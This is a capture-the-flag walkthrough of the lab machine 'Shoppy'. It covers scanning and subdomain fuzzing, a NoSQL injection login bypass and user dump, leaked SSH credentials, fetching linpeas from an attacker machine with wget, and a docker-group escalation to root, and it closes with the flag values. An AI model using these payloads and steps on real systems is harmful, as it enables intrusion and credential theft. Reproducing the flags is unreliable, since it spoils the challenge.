# Shoppy - Easy

```shell
sudo vim /etc/hosts
#map ip to shoppy.htb

nmap -T4 -p- -A -Pn -v shoppy.htb

feroxbuster -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

sudo wfuzz -c -f sub-fighter -u "http://shoppy.htb" -H "Host: FUZZ.shoppy.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

#avoid false positives
#-t for concurrent connections
sudo wfuzz -c -f sub-fighter -u "http://shoppy.htb" -H "Host: FUZZ.shoppy.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 169 -t 50
#this gives us a subdomain

sudo vim /etc/hosts
#map ip to mattermost.shoppy.htb

feroxbuster -u http://mattermost.shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500

#use nosql injection to bypass /login
#use same payload in search function

ssh jaeger@shoppy.htb
#use password found in the channels

#get user flag

cd /tmp

#in attacker machine
python3 -m http.server

#in ssh session
wget http://10.10.14.3:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

sudo -l
#we can run a command as 'deploy' user

sudo -u deploy /home/deploy/password-manager
#this asks for a master password

cat /home/deploy/password-manager
#check contents
#this contains master password in cleartext

sudo -u deploy /home/deploy/password-manager
#using correct master password
#we get creds for deploy

su deploy

id
#we are part of docker group

docker images
#we have alpine image

docker run -v /root:/mnt -it alpine
#root shell

find / -name root.txt 2>/dev/null

cat /mnt/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.4p1 (Debian)
  * 80 - http - nginx 1.23.1
  * 9093 - copycat

* We can start scanning the webpage for hidden directories.

* The webpage itself does not contain anything except a timer for 'Shoppy Beta' - it is not going to end anytime soon so we will have to look somewhere else for clues.

* Now, using ```feroxbuster```, we get the following directories:

  * /images
  * /css
  * /js
  * /assets
  * /login
  * /admin

* We cannot access any directory except /login, which gives us a login portal.

* As the .css and .js files do not contain any clues, we can search for any subdomains for this website using ```wfuzz```.

* We need to use the ```--hh``` flag with ```wfuzz``` to avoid false positives; we can use ```-t``` flag to increase the number of concurrent connections.

* After 10 minutes of running ```wfuzz```, we get a subdomain 'mattermost' - we can now map this subdomain to the machine IP as well.

* This subdomain also includes a login page - using default creds does not help.

* We can now enumerate this subdomain for hidden directories, but we do not get anything except /robots.txt - it does not contain anything.

* We can go back to <http://shoppy.htb/login> page and attempt to bypass login; for login portals, we can start with injection.

* We can capture a request to the login page using ```Burp Suite``` and forward it to Repeater, where we can inject the payloads.

* For injection payloads, we can refer [HackTricks](https://book.hacktricks.xyz/welcome/readme) or [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

* Using SQL injection does not work; however on attempting NoSQL injection, we are able to get access - using the payload ```admin'||' 1==1```

* This gives us access to the Shoppy App dashboard.

* Now, the dashboard allows us to search for users; to search for 'joe', the link would be at '/admin/search-users?username=joe'

* If we submit the NoSQL payload used earlier in the search function, we get a .json file to be downloaded.

* This file gives us the username and password hash for users 'admin' and 'josh'.

* We are unable to crack the 'admin' hash but for 'josh' we get the password 'remembermethisway'.

* Now, we can attempt to log into SSH using creds for 'josh' but it does not work.

* We also have a login page at <mattermost.shoppy.htb>, using these creds here works and we're able to login.

* This gives us access to a communication portal; we have two other users 'jess' and 'jaeger' here.

* There are multiple channels here - in one of the channels we find the creds "jaeger:Sh0ppyBest@pp!"

* We can log into SSH using these creds, and get user flag.

* For basic enumeration, we can check using ```linpeas```.

* Now, ```sudo -l``` shows that we can run the 'password-manager' app as deploy.

* Running the password-manager as deploy user shows that we require a master password.

* Reading the contents of the 'password-manager' program, we can see some strings; one part is of importance:

```Welcome to Josh password manager!Please enter your master password: SampleAccess granted!```

* Here, the only word we didn't see yet is 'Sample' - we can try this as the master password.

* Upon entering this password, we get the creds "deploy:Deploying@pp!"; use this to login as 'deploy' user.

* Using ```id```, we find out that we are part of 'dockers' group - we can exploit this to get root shell.

```markdown
1. User flag - ac54fac7c6032572724c9722e4f23ca3

2. Root flag - e8d8a7b062f5d8dec50818972069dcc6
```
